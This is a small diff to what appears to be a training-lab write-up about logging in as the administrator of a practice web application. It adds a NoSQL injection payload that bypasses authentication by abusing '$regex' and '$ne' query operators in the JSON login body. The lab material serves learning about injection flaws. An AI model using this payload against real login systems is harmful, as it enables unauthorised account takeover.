@@ -23,5 +23,4 @@ To solve the lab, log into the application as the administrator user.
 You can log in to your own account using the following credentials: wiener:peter. 
 ```
 
-* Payload use to detect : ` `
-* Payload to exploit the vuln : ` `
+* Payload to exploit the vuln : `{"username":{"$regex":"ad.*"},"password":{"$ne":""}} `
